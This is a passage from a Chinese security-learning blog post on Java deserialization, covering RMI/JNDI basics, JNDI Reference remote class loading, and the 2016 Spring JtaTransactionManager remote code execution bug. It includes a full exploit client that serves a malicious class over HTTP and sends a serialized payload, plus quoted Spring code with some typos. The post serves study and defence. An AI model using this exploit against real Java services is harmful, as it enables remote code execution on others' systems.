class="line"></span><br><span class="line">        <span class="comment">// 本地开启 1099 端口作为 RMI 服务，并以标识 "hello" 绑定方法对象</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        rmiServerImpl service2 = <span class="keyword">new</span> rmiServerImpl(<span class="string">"service2"</span>);</span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, service2);</span><br><span class="line">        System.out.println(<span class="string">"jdni server start..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xdsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdniClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 配置 JNDI 默认设置</span></span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        <span class="comment">// JNDI 获取 RMI 上的方法对象并进行调用</span></span><br><span class="line">        rmiServer rHello = (rmiServer) ctx.lookup(<span class="string">"hello"</span>);</span><br><span class="line">        String data = <span class="string">"This is jdni Client."</span>;</span><br><span class="line">        System.out.println(rHello.service(data));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>页面回显了<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-45-24.png" alt=" https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-45-24.png"></p>
+<p>看上去没什么问题，但是如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。<br>如以下代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"ClassName"</span>, <span class="string">"ClassName"</span>, <span class="string">"http://example.com:2333/"</span>);</span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure></p>
+<p>当有客户端通过 lookup(“refObj”) 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 CLASSPATH 去寻找被标识为 ClassName 的类，如果本地未找到，则会去请求 <a href="http://example.com:2333ClassName.class" target="_blank" rel="noopener">http://example.com:2333ClassName.class</a> 动态加载 classes 并调用 ClassName 的构造函数。讲到这里，攻击方法也就浮出水面了，如果refObj参数可控，我们即可rce。<br>当然这里还是有同学会说，正常的程序猿不会让lookup函数的参数给用户可控吧，的确事实确实如此，所以我们接着看。</p>
+<h4 id="spring-rce"><a href="#spring-rce" class="headerlink" title="spring rce"></a>spring rce</h4><p>下面我们来看一个实例2016年的Spring框架的反序列化漏洞<br>Spring 框架中的远程代码执行的缺陷在于spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager类，该类实现了Java Transaction API，主要功能是处理分布式的事务管理。<br>server代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">//创建socket</span></span><br><span class="line">         ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(Integer.parseInt(<span class="string">"9999"</span>));</span><br><span class="line">         System.out.println(<span class="string">"Server started on port "</span>+serverSocket.getLocalPort());</span><br><span class="line">         <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="comment">//等待链接</span></span><br><span class="line">            Socket socket=serverSocket.accept();</span><br><span class="line">            System.out.println(<span class="string">"Connection received from "</span>+socket.getInetAddress());            </span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">//读取对象</span></span><br><span class="line">               Object object = objectInputStream.readObject();</span><br><span class="line">               System.out.println(<span class="string">"Read object "</span>+object);                         </span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">               System.out.println(<span class="string">"Exception caught while reading object"</span>);                           </span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;           </span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>client代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String serverAddress = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            String localAddress= args[<span class="number">2</span>];</span><br><span class="line">            <span class="comment">//启动web server，提供远程下载要调用类的接口</span></span><br><span class="line">            System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">            HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8088</span>), <span class="number">0</span>);</span><br><span class="line">            httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">            httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">            httpServer.start();</span><br><span class="line">            <span class="comment">//下载恶意类的地址 http://127.0.0.1:8088/ExportObject.class</span></span><br><span class="line">            System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://"</span>+serverAddress+<span class="string">"/"</span>);</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">            Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">            System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">            <span class="comment">//jndi的调用地址</span></span><br><span class="line">            String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line">            org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">            object.setUserTransactionName(jndiAddress);</span><br><span class="line">            <span class="comment">//发送payload</span></span><br><span class="line">            System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-39-32.png" alt="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/Snipaste_2018-12-20_00-39-32.png"></p>
+<p>这里向Server发送的Payload是：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jndi的调用地址</span></span><br><span class="line">String jndiAddress = <span class="string">"rmi://127.0.0.1:1999/Object"</span>;</span><br><span class="line"><span class="comment">// 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量</span></span><br><span class="line">JtaTransactionManager object = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">object.setUserTransactionName(jndiAddress);</span><br></pre></td></tr></table></figure></p>
+<p>之前我们说过，反序列化时会调用被序列化类的readObject()方法，readObject()可以重写而实现一些其他的功能，我们看一下JtaTransactionManager类的readObject()方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Rely on default serialization; just initialize state after deserialization.</span></span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create template for client-side JNDI lookup.</span></span><br><span class="line">        <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Perform a fresh lookup for JTA handles.</span></span><br><span class="line">        initUserTransactionAndTransactionManager();</span><br><span class="line">        initTransactionSynchronizationRegistry();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>initUserTransactionAndTransactionManager()是用来初始化UserTransaction以及TransactionManager<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//Fetch JTA UserTransaction from JDNI, if necessary.</span></span><br><span class="line">            <span class="keyword">if</span>(StringUtils.haslength(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">            <span class="keyword">this</span>.userTransaction = lookupUserTransaction(<span class="keyword">this</span>.userTransactionName));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"> ***</span><br></pre></td></tr></table></figure></p>
+<p>lookupUserTransaction()方法会调用JndiTemplate的lookup()<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pubic &lt;T&gt; <span class="function">T <span class="title">lookup</span><span class="params">(String name,Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> NamingException</span>&#123;</span><br><span class="line">        Object jndiObject = lookup(name);</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br></pre></td></tr></table></figure></p>
+<p>由于<code>Reference reference = new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http://127.0.0.1:8000/&quot;);</code>存在Reference类，所以会自动下载该类并执行该类的构造方法。<br>未完待续</p>
+<p>参考链接</p>
+<p><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/115849.html</a><br><a href="https://www.vulbox.com/knowledge/detail/?id=11" target="_blank" rel="noopener">https://www.vulbox.com/knowledge/detail/?id=11</a><br><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/" target="_blank" rel="noopener">https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 Pupil 的个人博客">Pupil</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="http://pupiles.com/java_unserialize1.html" title="从零开始的JAVA反序列化(一)">从零开始的JAVA反序列化(一)</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="http://pupiles.com/java_unserialize1.html" title="从零开始的JAVA反序列化(一)">http://pupiles.com/java_unserialize1.html</a>
+        </li>
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2018年12月20日 - 01时12分
+        </li>  
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 Pupil 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> <br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+    <footer class="post-footer">
+		   
+      
+        <div class="post-tags">
+          
+            <a href="/tags/学习笔记/" rel="tag"><i class="fa fa-tag"></i> 学习笔记</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/lctf2018.html" rel="next" title="谈谈LCTF2018">
+                <i class="fa fa-chevron-left"></i> 谈谈LCTF2018
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/touxiang.jpg" alt="Pupil">
+          <p class="site-author-name" itemprop="name">Pupil</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">31</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		 <br><br>
+         <span id="busuanzi_container_site_uv">
+         <b><span id="busuanzi_value_site_uv"></span></b><br>
+		 <span class="site-state-item-name">访客</span>
+         </span><br><br>
+        </nav>
+
+        
+		
+		<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=432506345&auto=0&height=66"></iframe>
+		<div align="left" font-family:="" "arial","microsoft="" yahei","黑体","宋体",sans-serif="">
+		<b><h1>个人简介</h1></b>
+		<p>
+		菜鸡Web狗一只，中二病患者，热爱代码审计，被CTF折磨的要死要活，拼命学习中。。。<br>
+		爱好：二次元，web渗透，偶尔会突然很文艺<br>
+		QQ：89335778
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </p></div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#从一则代码谈谈什么是java反序列化"><span class="nav-number">1.</span> <span class="nav-text">从一则代码谈谈什么是java反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二段代码"><span class="nav-number">2.</span> <span class="nav-text">第二段代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化与RMI和JDNI之间的小故事"><span class="nav-number">3.</span> <span class="nav-text">反序列化与RMI和JDNI之间的小故事</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spring-rce"><span class="nav-number">4.</span> <span class="nav-text">spring rce</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pupil</span>
+</div>
+
+
+<div class="powered-by">
+  技术支持By Pupiles
+</div>
+
+<div class="theme-info">
+  博客 -XDSEC
+</div>
+
+
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "70c8d4b1771e4a19bf986d2a1c098b34",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("YQEVdCwfMShMt1vjaRojsYrr-gzGzoHsz", "APOpeTkajaCsoqVKYvcCMWwt");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
